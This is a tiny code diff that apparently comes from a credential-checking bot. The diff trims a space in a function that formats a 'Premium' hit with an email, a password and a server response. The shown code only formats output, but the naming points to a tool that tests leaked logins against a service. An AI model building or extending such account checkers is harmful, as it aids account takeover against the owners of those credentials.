@@ -110,7 +110,7 @@ user_tasks = {}
 def format_hit(email, password, resp):
     return (
         "✅ <b>Premium</b>\n"
-        f"<b>Email:</b> <code> {email}</code>\n<b>Pass</b>: <code>{password}</code>\n"
+        f"<b>Email:</b> <code>{email}</code>\n<b>Pass</b>: <code>{password}</code>\n"
         f"<b>Response:</b> <code> {resp.get('message','')}</code>"
     )
 
